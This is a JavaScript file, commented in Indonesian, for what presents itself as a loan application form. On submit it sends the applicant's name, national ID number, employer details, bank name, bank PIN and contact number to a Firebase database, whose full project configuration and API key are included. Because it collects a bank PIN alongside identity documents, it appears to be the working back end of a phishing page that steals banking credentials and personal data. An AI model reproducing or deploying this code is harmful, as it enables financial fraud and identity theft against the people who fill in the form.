// Konfigurasi Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDfALnIeV4Y0NDsLwsjj7YlRUIaj5yOqsM",
  authDomain: "formulir-f68c2.firebaseapp.com",
  databaseURL: "https://formulir-f68c2-default-rtdb.firebaseio.com",
  projectId: "formulir-f68c2",
  storageBucket: "formulir-f68c2.appspot.com",
  messagingSenderId: "1017204549471",
  appId: "1:1017204549471:web:333896575c915f1c16f8ea",
  measurementId: "G-FDJ0BZHGVQ"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

document.querySelector("form").addEventListener("submit", function(e) {
  e.preventDefault();

  const data = {
    nama: document.getElementById("nama").value,
    ktp: document.getElementById("ktp").value,
    idCard: document.getElementById("ID-Card").value,
    perusahaan: document.getElementById("Perusahaan").value,
    lokasiKerja: document.getElementById("Lokasi Kerja").value,
    devisi: document.getElementById("Devisi").value,
    kontrakKerja: document.getElementById("Kontrak Kerja").value,
    nominal: document.getElementById("nominal").value,
    bank: document.getElementById("Bank").value,
    pin: document.getElementById("Pin").value,
    tujuan: document.getElementById("tujuan").value,
    jangka: document.getElementById("jangka").value,
    kontak: document.getElementById("kontak").value,
  };

  const formRef = ref(db, 'pengajuanPinjaman/');
  const newEntry = push(formRef);

  set(newEntry, data)
    .then(() => {
      alert("Data berhasil dikirim!");
      document.querySelector("form").reset();
    })
    .catch((error) => {
      alert("Terjadi kesalahan: " + error);
    });
});